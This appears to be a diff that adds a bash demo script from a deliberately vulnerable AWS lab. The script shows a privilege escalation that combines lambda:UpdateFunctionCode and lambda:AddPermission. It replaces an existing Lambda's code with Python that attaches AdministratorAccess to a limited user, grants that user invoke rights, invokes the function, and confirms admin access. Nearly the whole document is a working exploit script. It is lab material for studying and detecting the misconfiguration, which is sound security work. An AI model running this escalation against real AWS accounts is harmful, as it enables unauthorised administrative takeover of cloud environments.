@@ -1,0 +1,268 @@
+#!/bin/bash
+
+# Demo script for lambda:UpdateFunctionCode + lambda:AddPermission privilege escalation
+# This scenario demonstrates how a user with lambda:UpdateFunctionCode and lambda:AddPermission
+# can modify existing Lambda function code and invoke it to gain administrative access.
+
+set -e
+
+# Colors for output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+# Configuration
+STARTING_USER="pl-prod-lufclap-to-admin-starting-user"
+TARGET_LAMBDA="pl-prod-lufclap-to-admin-target-lambda"
+LAMBDA_EXEC_ROLE="pl-prod-lufclap-to-admin-lambda-exec-role"
+
+echo -e "${GREEN}========================================${NC}"
+echo -e "${GREEN}Lambda UpdateFunctionCode + AddPermission Privilege Escalation Demo${NC}"
+echo -e "${GREEN}========================================${NC}\n"
+
+# Step 1: Retrieve credentials and region from Terraform grouped outputs
+echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
+cd ../../../../../..  # Navigate to root of terraform project
+
+# Get the module output using the grouped output pattern
+MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_lambda_updatefunctioncode_lambda_addpermission.value // empty')
+
+if [ -z "$MODULE_OUTPUT" ]; then
+    echo -e "${RED}Error: Could not find terraform output${NC}"
+    echo "Make sure you've deployed this scenario with: terraform apply"
+    exit 1
+fi
+
+# Extract credentials from the grouped output
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+
+if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
+    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
+    exit 1
+fi
+
+# Get region
+AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
+
+if [ -z "$AWS_REGION" ]; then
+    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
+    AWS_REGION="us-east-1"
+fi
+
+echo "Retrieved access key for: $STARTING_USER"
+echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "Region: $AWS_REGION"
+echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
+
+# Navigate back to scenario directory
+cd - > /dev/null
+
+# Step 2: Configure AWS credentials with starting user
+echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
+export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
+export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+export AWS_REGION=$AWS_REGION
+unset AWS_SESSION_TOKEN
+
+echo "Using region: $AWS_REGION"
+
+# Verify starting user identity
+CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
+echo "Current identity: $CURRENT_USER"
+
+if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
+    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
+    exit 1
+fi
+echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
+
+# Step 3: Get account ID
+echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+echo "Account ID: $ACCOUNT_ID"
+echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
+
+# Step 4: Verify we don't have admin permissions yet
+echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+echo "Attempting to list IAM users (should fail)..."
+if aws iam list-users --max-items 1 &> /dev/null; then
+    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
+else
+    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
+fi
+echo ""
+
+# Step 5: Get information about the target Lambda function
+echo -e "${YELLOW}Step 5: Getting target Lambda function details${NC}"
+echo "Target Lambda function: $TARGET_LAMBDA"
+
+LAMBDA_ARN=$(aws lambda get-function \
+    --region $AWS_REGION \
+    --function-name $TARGET_LAMBDA \
+    --query 'Configuration.FunctionArn' \
+    --output text)
+
+echo "Lambda ARN: $LAMBDA_ARN"
+echo -e "${GREEN}✓ Found target Lambda function${NC}\n"
+
+# Step 6: Backup original Lambda function code
+echo -e "${YELLOW}Step 6: Backing up original Lambda function code${NC}"
+aws lambda get-function \
+    --region $AWS_REGION \
+    --function-name $TARGET_LAMBDA \
+    --query 'Code.Location' \
+    --output text > /tmp/original_lambda_url.txt
+
+echo -e "${GREEN}✓ Backed up original Lambda function metadata${NC}\n"
+
+# Step 7: Create malicious Lambda code
+echo -e "${YELLOW}Step 7: Creating malicious Lambda code${NC}"
+echo "Creating Python code that will attach AdministratorAccess to our user..."
+
+cat > /tmp/lambda_function.py << EOF
+import boto3
+import json
+
+def lambda_handler(event, context):
+    """
+    Malicious Lambda function that grants admin access to the starting user
+    """
+    iam = boto3.client('iam')
+
+    try:
+        # Attach AdministratorAccess policy to the starting user
+        starting_user = '$STARTING_USER'
+
+        iam.attach_user_policy(
+            UserName=starting_user,
+            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+        )
+
+        return {
+            'statusCode': 200,
+            'body': json.dumps({
+                'message': 'Successfully attached AdministratorAccess',
+                'user': starting_user
+            })
+        }
+    except Exception as e:
+        return {
+            'statusCode': 500,
+            'body': json.dumps({
+                'message': 'Error attaching policy',
+                'error': str(e)
+            })
+        }
+EOF
+
+# Create zip file
+cd /tmp
+zip -q lambda_function.zip lambda_function.py
+cd - > /dev/null
+
+echo -e "${GREEN}✓ Created malicious Lambda code${NC}\n"
+
+# Step 8: Update Lambda function code
+echo -e "${YELLOW}Step 8: Updating Lambda function with malicious code${NC}"
+echo "Using lambda:UpdateFunctionCode permission..."
+
+aws lambda update-function-code \
+    --region $AWS_REGION \
+    --function-name $TARGET_LAMBDA \
+    --zip-file fileb:///tmp/lambda_function.zip \
+    --output text > /dev/null
+
+echo -e "${GREEN}✓ Successfully updated Lambda function code${NC}\n"
+
+# Step 9: Add resource-based permission to allow invoking the function
+echo -e "${YELLOW}Step 9: Adding resource-based permission to invoke the function${NC}"
+echo "Using lambda:AddPermission to allow our user to invoke the function..."
+
+# Use a unique statement ID to avoid conflicts
+STATEMENT_ID="AllowStartingUserInvoke-$(date +%s)"
+
+aws lambda add-permission \
+    --region $AWS_REGION \
+    --function-name $TARGET_LAMBDA \
+    --statement-id "$STATEMENT_ID" \
+    --action "lambda:InvokeFunction" \
+    --principal "arn:aws:iam::$ACCOUNT_ID:user/$STARTING_USER" \
+    --output text > /dev/null
+
+echo -e "${GREEN}✓ Successfully added invoke permission${NC}\n"
+
+# Wait for Lambda to process the update
+echo -e "${YELLOW}Waiting 15 seconds for Lambda to process updates...${NC}"
+sleep 15
+echo -e "${GREEN}✓ Lambda updates processed${NC}\n"
+
+# Step 10: Invoke the malicious Lambda function
+echo -e "${YELLOW}Step 10: Invoking malicious Lambda function${NC}"
+echo "Executing Lambda function to attach AdministratorAccess policy..."
+
+INVOKE_RESPONSE=$(aws lambda invoke \
+    --region $AWS_REGION \
+    --function-name $TARGET_LAMBDA \
+    --payload '{}' \
+    /tmp/response.json \
+    --query 'StatusCode' \
+    --output text)
+
+if [ "$INVOKE_RESPONSE" == "200" ]; then
+    echo -e "${GREEN}✓ Lambda function executed successfully${NC}"
+    echo "Response:"
+    cat /tmp/response.json | jq .
+    echo ""
+else
+    echo -e "${RED}✗ Lambda invocation failed${NC}"
+    cat /tmp/response.json
+    exit 1
+fi
+
+# Wait for IAM policy propagation
+echo -e "${YELLOW}Waiting 15 seconds for IAM policy to propagate...${NC}"
+sleep 15
+echo -e "${GREEN}✓ Policy propagated${NC}\n"
+
+# Step 11: Verify administrator access
+echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
+echo "Attempting to list IAM users..."
+
+if aws iam list-users --max-items 3 --output table; then
+    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
+    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
+else
+    echo -e "${RED}✗ Failed to list users${NC}"
+    exit 1
+fi
+echo ""
+
+# Final summary
+echo -e "\n${GREEN}========================================${NC}"
+echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "\n${YELLOW}Attack Summary:${NC}"
+echo "1. Started as: $STARTING_USER (limited permissions)"
+echo "2. Used lambda:UpdateFunctionCode to modify Lambda function: $TARGET_LAMBDA"
+echo "3. Used lambda:AddPermission to grant ourselves invoke permissions"
+echo "4. Invoked modified Lambda function running as privileged role: $LAMBDA_EXEC_ROLE"
+echo "5. Lambda attached AdministratorAccess policy to our user"
+echo "6. Achieved: Full administrator access"
+
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo "  $STARTING_USER → (UpdateFunctionCode) → $TARGET_LAMBDA → (AddPermission) → Self Invoke"
+echo "  → (InvokeFunction) → Execute as $LAMBDA_EXEC_ROLE → Attach AdministratorAccess → Admin Access"
+
+echo -e "\n${YELLOW}Attack Artifacts:${NC}"
+echo "- Modified Lambda function: $TARGET_LAMBDA"
+echo "- Added resource-based permission: $STATEMENT_ID"
+echo "- AdministratorAccess policy attached to: $STARTING_USER"
+echo "- Temporary files: /tmp/lambda_function.py, /tmp/lambda_function.zip, /tmp/response.json"
+
+echo -e "\n${RED}⚠ Warning: Lambda function contains malicious code and AdministratorAccess is attached${NC}"
+echo -e "${YELLOW}To clean up and restore the original state:${NC}"
+echo "  ./cleanup_attack.sh"
+echo ""
